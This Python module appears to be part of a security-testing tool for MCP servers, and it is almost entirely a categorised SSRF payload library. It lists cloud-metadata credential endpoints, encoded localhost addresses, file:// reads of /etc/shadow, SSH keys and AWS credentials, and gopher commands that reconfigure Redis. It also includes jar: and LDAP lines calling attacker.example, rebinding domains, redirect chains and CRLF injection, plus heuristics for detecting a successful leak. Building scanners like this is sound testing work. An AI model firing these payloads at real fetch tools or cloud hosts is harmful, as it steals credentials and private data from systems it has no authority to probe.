"""SSRF / URL-fetch abuse payloads for R1 (unauthorised data access).

Targets tools that accept URL-like parameters and internally fetch them,
which is common for MCP servers that wrap web APIs, scrapers, image
downloaders, RSS readers, etc. A tool that blindly fetches whatever URL
it's given can be coerced into reading cloud metadata, internal services,
or local files — classic SSRF.

Payload categories:

* ``cloud_metadata``     — AWS/GCP/Azure/Alibaba/Oracle/IBM/Tencent metadata
* ``internal_ip``        — RFC1918 + localhost + loopback encodings
* ``ip_obfuscation``     — decimal/octal/hex/IPv6/IDN bypasses
* ``url_scheme``         — non-http schemes (file/gopher/dict/ftp/jar/ldap)
* ``internal_service``   — Redis/Memcached/Elasticsearch/Consul/etcd probes
* ``orchestrator``       — Kubernetes/Docker/Nomad control planes
* ``ci_dev_tools``       — Jenkins/GitLab/Gitea/Sonarqube probes
* ``dns_rebind``         — domains that resolve to internal addresses
* ``redirect_chain``     — open redirects landing on internal hosts
* ``parser_confusion``   — URL-parser ambiguity tricks (auth/userinfo/fragment)
"""

from __future__ import annotations

# ---------------------------------------------------------------------------
# Cloud-metadata endpoints across major providers
# ---------------------------------------------------------------------------

CLOUD_METADATA: list[str] = [
    # AWS IMDSv1 — still enabled on many instances.
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://169.254.169.254/latest/meta-data/iam/info",
    "http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance",
    "http://169.254.169.254/latest/user-data",
    "http://169.254.169.254/latest/dynamic/instance-identity/document",
    # AWS IMDSv2 token path — response headers reveal protection state.
    "http://169.254.169.254/latest/api/token",
    # AWS Lambda runtime API — leaks credentials when SSRF is on a Lambda.
    "http://127.0.0.1:9001/2018-06-01/runtime/invocation/next",
    # AWS ECS task-credentials endpoint (IP literal too — sometimes whitelisted).
    "http://169.254.170.2/v2/credentials/",

    # GCP metadata (requires Metadata-Flavor header, but server may add it).
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity",
    "http://metadata.google.internal/computeMetadata/v1/project/project-id",
    "http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env",
    "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token",

    # Azure IMDS.
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net",
    "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",

    # Alibaba Cloud.
    "http://100.100.100.200/latest/meta-data/",
    "http://100.100.100.200/latest/meta-data/ram/security-credentials/",

    # DigitalOcean.
    "http://169.254.169.254/metadata/v1/",
    "http://169.254.169.254/metadata/v1.json",

    # Oracle Cloud (OCI).
    "http://169.254.169.254/opc/v1/instance/",
    "http://169.254.169.254/opc/v2/instance/",
    "http://169.254.169.254/opc/v2/identity/cert.pem",

    # IBM Cloud.
    "http://169.254.169.254/metadata/v1/instance",
    "http://api.metadata.cloud.ibm.com/metadata/v1/instance",

    # Tencent Cloud.
    "http://metadata.tencentyun.com/latest/meta-data/",
    "http://metadata.tencentyun.com/latest/meta-data/cam/security-credentials/",

    # Huawei Cloud.
    "http://169.254.169.254/openstack/latest/meta_data.json",
    "http://169.254.169.254/openstack/latest/securitykey",

    # OpenStack (generic).
    "http://169.254.169.254/openstack/latest/user_data",
    "http://169.254.169.254/openstack/latest/network_data.json",

    # Hetzner Cloud.
    "http://169.254.169.254/hetzner/v1/metadata",

    # Packet / Equinix.
    "http://metadata.packet.net/metadata",
]

# ---------------------------------------------------------------------------
# Internal IPs — localhost and RFC1918 ranges
# ---------------------------------------------------------------------------

INTERNAL_IP: list[str] = [
    "http://127.0.0.1/",
    "http://127.0.0.1:22/",
    "http://127.0.0.1:80/",
    "http://127.0.0.1:443/",
    "http://127.0.0.1:3306/",       # MySQL
    "http://127.0.0.1:5432/",       # PostgreSQL
    "http://127.0.0.1:6379/",       # Redis
    "http://127.0.0.1:11211/",      # Memcached
    "http://127.0.0.1:9200/",       # Elasticsearch
    "http://127.0.0.1:8500/",       # Consul
    "http://127.0.0.1:2379/",       # etcd
    "http://127.0.0.1:8080/",       # generic admin
    "http://127.0.0.1:8888/",
    "http://127.0.0.1:9000/",       # MinIO / SonarQube
    "http://127.0.0.1:5000/",       # Docker registry / Flask
    "http://localhost/",
    "http://localhost.localdomain/",
    "http://[::1]/",
    "http://[::ffff:127.0.0.1]/",
    "http://[0:0:0:0:0:0:0:1]/",
    "http://[0:0:0:0:0:ffff:7f00:1]/",
    "http://0.0.0.0/",

    # RFC1918 ranges.
    "http://10.0.0.1/",
    "http://10.10.10.10/",
    "http://172.16.0.1/",
    "http://172.31.255.254/",
    "http://192.168.0.1/",
    "http://192.168.1.1/",
    "http://192.168.255.254/",
    # CGNAT / shared-address space.
    "http://100.64.0.1/",
    # Link-local.
    "http://169.254.0.1/",
]

# ---------------------------------------------------------------------------
# IP obfuscation tricks — decimal/octal/hex/IDN/double-fetch
# ---------------------------------------------------------------------------

IP_OBFUSCATION: list[str] = [
    # Decimal-encoded 127.0.0.1 — bypasses naive string matching.
    "http://2130706433/",
    "http://2130706433:80/",
    # Octal-encoded.
    "http://0177.0.0.1/",
    "http://0177.0.0.01/",
    "http://0000177.0.0.1/",
    # Hex-encoded.
    "http://0x7f.0x0.0x0.0x1/",
    "http://0x7f000001/",
    "http://0x7F.0X00.0X00.0X01/",
    # Mixed-radix.
    "http://0x7f.0.0.1/",
    "http://0177.0.0.0x1/",
    # Dotless decimal of 169.254.169.254.
    "http://2852039166/",
    "http://0xa9fea9fe/",
    "http://0251.0376.0251.0376/",

    # IPv6 abbreviation forms of localhost / link-local.
    "http://[::]/",
    "http://[::127.0.0.1]/",
    "http://[fe80::1]/",
    "http://[fe80::a9fe:a9fe]/",

    # Trailing dot / extra dots — many parsers strip but DNS resolves.
    "http://localhost./",
    "http://127.0.0.1./",

    # Zero-pad parts.
    "http://127.000.000.001/",
    "http://0000:0000:0000:0000:0000:0000:0000:0001/",

    # IDN homograph — Cyrillic look-alike for "internal".
    "http://xn--internal-xb4d.example/",

    # Wildcard DNS pointing at private IP (sslip.io / nip.io style).
    "http://127-0-0-1.sslip.io/",
    "http://10-0-0-1.sslip.io/",
    "http://192-168-1-1.nip.io/",
]

# ---------------------------------------------------------------------------
# URL schemes other than http/https
# ---------------------------------------------------------------------------

URL_SCHEME: list[str] = [
    # File scheme — direct local-file read.
    "file:///etc/passwd",
    "file:///etc/shadow",
    "file:///proc/self/environ",
    "file:///proc/self/cmdline",
    "file:///root/.ssh/id_rsa",
    "file:///root/.aws/credentials",
    "file:///home/user/.aws/credentials",
    "file://localhost/etc/passwd",
    "file://C:/Windows/win.ini",
    "file:///c:/windows/win.ini",
    "file:///c:/users/administrator/.ssh/id_rsa",

    # Gopher — lets the fetcher send arbitrary bytes to a TCP port,
    # commonly abused to talk to Redis/memcached/smtp from inside.
    "gopher://127.0.0.1:6379/_INFO",
    "gopher://127.0.0.1:6379/_FLUSHALL",
    "gopher://127.0.0.1:6379/_CONFIG%20SET%20dir%20/var/www/html",
    "gopher://127.0.0.1:25/_HELO%20attacker.com",
    "gopher://127.0.0.1:25/_MAIL%20FROM:<attacker@evil>",
    "gopher://127.0.0.1:11211/_stats",
    "gopher://127.0.0.1:5432/_",       # postgres protocol smuggling
    "gopher://127.0.0.1:3306/_",       # mysql

    # Dict — leaks data from dict/redis/memcached banners.
    "dict://127.0.0.1:6379/INFO",
    "dict://127.0.0.1:11211/stat",
    "dict://127.0.0.1:25/HELO:x",

    # FTP.
    "ftp://anonymous@127.0.0.1/",
    "ftp://attacker.com/.ssh/id_rsa",

    # TFTP / SFTP / SMB.
    "tftp://127.0.0.1/x",
    "sftp://127.0.0.1/etc/passwd",
    "smb://127.0.0.1/share/",

    # JAR scheme — historically RCE via classloader.
    "jar:http://attacker.example/evil.jar!/",
    "jar:file:///tmp/evil.jar!/",

    # LDAP — Log4Shell-style JNDI handoff (when fetcher delegates to JNDI).
    "ldap://127.0.0.1:389/",
    "ldap://attacker.example:1389/Object",
    "ldaps://attacker.example/",

    # PHP wrappers (PHP-based servers only).
    "php://filter/convert.base64-encode/resource=/etc/passwd",
    "php://input",
    "expect://id",
    "data://text/plain;base64,SGVsbG8=",

    # Blob / fetch oddities.
    "blob:http://127.0.0.1/x",
    "view-source:http://127.0.0.1/",

    # Special: javascript / data URIs that LLM tools might render.
    "javascript:alert(1)",
    "data:text/html,<script>alert(1)</script>",
]

# ---------------------------------------------------------------------------
# Internal-service banner / API probes
# ---------------------------------------------------------------------------

INTERNAL_SERVICE: list[str] = [
    # Elasticsearch / OpenSearch.
    "http://127.0.0.1:9200/_cluster/health",
    "http://127.0.0.1:9200/_cat/indices",
    "http://127.0.0.1:9200/_cat/nodes",
    "http://127.0.0.1:9200/_search",
    "http://127.0.0.1:9200/.kibana/_search",
    # Solr.
    "http://127.0.0.1:8983/solr/admin/cores?action=STATUS",
    # MongoDB REST (deprecated but still around).
    "http://127.0.0.1:28017/",
    # CouchDB.
    "http://127.0.0.1:5984/_all_dbs",
    "http://127.0.0.1:5984/_users/_all_docs",
    # Redis HTTP-style probes (works through gopher; included for parser tests).
    "http://127.0.0.1:6379/",
    # Consul.
    "http://127.0.0.1:8500/v1/agent/self",
    "http://127.0.0.1:8500/v1/kv/?recurse",
    "http://127.0.0.1:8500/v1/catalog/services",
    # etcd.
    "http://127.0.0.1:2379/v2/keys/?recursive=true",
    "http://127.0.0.1:2379/version",
    # Vault.
    "http://127.0.0.1:8200/v1/sys/health",
    "http://127.0.0.1:8200/v1/sys/mounts",
    # Prometheus / metrics scrape.
    "http://127.0.0.1:9090/api/v1/targets",
    "http://127.0.0.1:9090/metrics",
    "http://127.0.0.1:9100/metrics",       # node_exporter
    # Grafana.
    "http://127.0.0.1:3000/api/datasources",
    "http://127.0.0.1:3000/api/admin/settings",
    # RabbitMQ management.
    "http://guest:guest@127.0.0.1:15672/api/overview",
    # Kafka — REST proxy.
    "http://127.0.0.1:8082/topics",
    # Spring Boot Actuator.
    "http://127.0.0.1:8080/actuator/env",
    "http://127.0.0.1:8080/actuator/heapdump",
    "http://127.0.0.1:8080/actuator/mappings",
    # Eureka.
    "http://127.0.0.1:8761/eureka/apps",
]

# ---------------------------------------------------------------------------
# Orchestrator / control-plane endpoints
# ---------------------------------------------------------------------------

ORCHESTRATOR: list[str] = [
    # Kubernetes API server (commonly reachable from pods).
    "https://kubernetes.default.svc/api/v1/secrets",
    "https://kubernetes.default.svc/api/v1/namespaces/kube-system/secrets",
    "https://kubernetes.default.svc/api/v1/pods",
    "https://kubernetes.default.svc/openapi/v2",
    # Kubelet — heartily exposed in misconfigured clusters.
    "http://127.0.0.1:10255/pods",
    "http://127.0.0.1:10255/stats/summary",
    "https://127.0.0.1:10250/pods",
    "https://127.0.0.1:10250/run/default/podname/containername",
    # cAdvisor.
    "http://127.0.0.1:4194/api/v1.3/containers/",

    # Docker daemon — TCP socket exposure is RCE.
    "http://127.0.0.1:2375/version",
    "http://127.0.0.1:2375/containers/json",
    "http://127.0.0.1:2375/images/json",
    "http://127.0.0.1:2376/version",
    # Docker socket via HTTP (when /var/run/docker.sock is proxied).
    "http://docker/version",

    # Nomad.
    "http://127.0.0.1:4646/v1/agent/self",
    "http://127.0.0.1:4646/v1/jobs",

    # Mesos.
    "http://127.0.0.1:5050/master/state",

    # OpenShift router stats.
    "http://127.0.0.1:1936/metrics",
]

# ---------------------------------------------------------------------------
# CI / dev-tool dashboards
# ---------------------------------------------------------------------------

CI_DEV_TOOLS: list[str] = [
    # Jenkins.
    "http://127.0.0.1:8080/script",
    "http://127.0.0.1:8080/computer/(master)/api/json",
    "http://127.0.0.1:8080/asynchPeople/api/json",
    # GitLab.
    "http://127.0.0.1/api/v4/projects",
    "http://127.0.0.1/api/v4/runners/all",
    # Gitea / Forgejo.
    "http://127.0.0.1:3000/api/v1/repos/search",
    # SonarQube.
    "http://127.0.0.1:9000/api/system/info",
    # Nexus / Artifactory.
    "http://127.0.0.1:8081/service/rest/v1/repositories",
    "http://127.0.0.1:8081/artifactory/api/system/configuration",
    # MinIO.
    "http://127.0.0.1:9000/minio/health/live",
    # Portainer.
    "http://127.0.0.1:9000/api/endpoints",
]

# ---------------------------------------------------------------------------
# DNS rebinding / wildcard-resolver tricks
# ---------------------------------------------------------------------------

DNS_REBIND: list[str] = [
    # Public DNS rebinding services. The host resolves to a public IP
    # first, then to 127.0.0.1 on a second lookup — defeating naive
    # "resolve once, check, then fetch" guards.
    "http://localtest.me/",
    "http://customer1.app.localhost.my.company.127.0.0.1.nip.io/",
    "http://127.0.0.1.nip.io/",
    "http://10.0.0.1.nip.io/",
    "http://169.254.169.254.nip.io/",
    "http://localhost.directory/",
    "http://lacolhost.com/",
    # sslip.io variants.
    "http://127-0-0-1.sslip.io/",
    "http://169-254-169-254.sslip.io/",
    # rbndr (purpose-built rebinder).
    "http://7f000001.c0a80001.rbndr.us/",
]

# ---------------------------------------------------------------------------
# Open-redirect chains landing on internal targets
# ---------------------------------------------------------------------------

REDIRECT_CHAIN: list[str] = [
    "http://httpbin.org/redirect-to?url=http://169.254.169.254/",
    "http://httpbin.org/redirect-to?url=file:///etc/passwd",
    "https://httpbin.org/absolute-redirect/3?url=http://127.0.0.1/",
    # Google open-redirect classic.
    "https://www.google.com/url?q=http://169.254.169.254/",
    # Generic 30x chain abuse.
    "http://attacker.example/redirect?to=http://127.0.0.1:6379/",
]

# ---------------------------------------------------------------------------
# URL-parser confusion — userinfo/fragment/auth tricks
# ---------------------------------------------------------------------------

PARSER_CONFUSION: list[str] = [
    # Userinfo trick: many parsers see "evil" as host, browsers see "internal".
    "http://evil.example#@127.0.0.1/",
    "http://evil.example@127.0.0.1/",
    "http://evil.example:80@127.0.0.1/",
    "http://127.0.0.1#@evil.example/",
    # Whitespace / control-char in host (CVE class).
    "http://127.0.0.1\t.evil.example/",
    "http://127.0.0.1\n.evil.example/",
    # Backslash that browsers normalise to slash.
    "http:\\\\127.0.0.1\\",
    "http://127.0.0.1\\@evil.example/",
    # Triple slash — some parsers treat as authority-less.
    "http:///169.254.169.254/",
    # Schema-less relative URL.
    "//169.254.169.254/",
    # Embedded port in hostname via percent-encoding.
    "http://127.0.0.1%3A6379/",
    # Path-only URL trick where attacker hopes server prepends a base.
    "/admin/api",
    # Double-URL-encoded scheme.
    "http%3A%2F%2F169.254.169.254%2F",
    # Punycode confusion + IDN.
    "http://xn--ls8h.example/",
    # CRLF injection in URL — header smuggling.
    "http://127.0.0.1/%0d%0aHost:%20attacker.example",
    "http://127.0.0.1/%0aSet-Cookie:%20pwn=1",
]


PAYLOADS: dict[str, list[str]] = {
    "cloud_metadata": CLOUD_METADATA,
    "internal_ip": INTERNAL_IP,
    "ip_obfuscation": IP_OBFUSCATION,
    "url_scheme": URL_SCHEME,
    "internal_service": INTERNAL_SERVICE,
    "orchestrator": ORCHESTRATOR,
    "ci_dev_tools": CI_DEV_TOOLS,
    "dns_rebind": DNS_REBIND,
    "redirect_chain": REDIRECT_CHAIN,
    "parser_confusion": PARSER_CONFUSION,
}


def generate_ssrf_payloads() -> list[tuple[str, str]]:
    out: list[tuple[str, str]] = []
    for category, values in PAYLOADS.items():
        for v in values:
            out.append(("ssrf_" + category, v))
    return out


# ---------------------------------------------------------------------------
# Response-side indicators
# ---------------------------------------------------------------------------

# Tokens that appear in real cloud-metadata responses. If any of these show
# up in a tool's response, SSRF almost certainly succeeded.
METADATA_INDICATORS: list[str] = [
    # AWS
    "ami-id",
    "instance-id",
    "iam/security-credentials",
    "AccessKeyId",
    "SecretAccessKey",
    "SessionToken",
    "ASIA",  # AWS temp-key prefix
    "AKIA",  # AWS perm-key prefix
    # GCP
    "computeMetadata",
    "service-accounts",
    "Metadata-Flavor",
    "default/token",
    # Azure
    "subscriptionId",
    "resourceGroupName",
    "vmId",
    "Microsoft.Compute",
    # Alibaba / Tencent / Oracle / IBM
    "ram/security-credentials",
    "cam/security-credentials",
    "opc/v1/instance",
    "opc/v2/instance",
    # OpenStack
    "openstack/latest/meta_data",
    # Kubernetes
    "BEGIN CERTIFICATE",
    "kube-apiserver",
    "system:serviceaccount",
]

# Tokens suggesting a file-scheme read succeeded.
FILE_READ_INDICATORS: list[str] = [
    "root:x:0:0",
    "daemon:x:",
    "[extensions]",
    "HOME=",
    "PATH=",
    "BEGIN OPENSSH PRIVATE KEY",
    "BEGIN RSA PRIVATE KEY",
    "aws_access_key_id",
    "aws_secret_access_key",
    "for 16-bit app support",  # win.ini header
]

# Tokens suggesting internal service probe landed.
INTERNAL_SERVICE_INDICATORS: list[str] = [
    # Redis
    "redis_version",
    "redis_mode",
    "uptime_in_seconds",
    # Memcached
    "memcached",
    "STAT pid",
    "STAT version",
    # SSH
    "SSH-1.",
    "SSH-2.",
    # HTTP banner
    "HTTP/1.0",
    "HTTP/1.1",
    # SMTP
    "220 ",
    "250 OK",
    # Elasticsearch
    "cluster_name",
    "cluster_uuid",
    # Consul / etcd / Vault
    "Consul",
    "etcd_",
    "vault_",
    # Spring actuator
    "activeProfiles",
    "spring.profiles.active",
    # Generic banner
    "Welcome to",
]

# Docker / Kubernetes / orchestrator markers.
ORCHESTRATOR_INDICATORS: list[str] = [
    "ApiVersion",
    "containerd://",
    "docker://",
    "kube-system",
    "ServiceAccount",
    "io.kubernetes.pod.namespace",
    "Containers",
    "Mounts",
]


def looks_like_ssrf_success(response_text: str) -> bool:
    """Heuristic: did the response contain data only reachable via SSRF?"""
    lower = response_text.lower()
    for ind in METADATA_INDICATORS + INTERNAL_SERVICE_INDICATORS + ORCHESTRATOR_INDICATORS:
        if ind.lower() in lower:
            return True
    for ind in FILE_READ_INDICATORS:
        if ind in response_text:
            return True
    return False
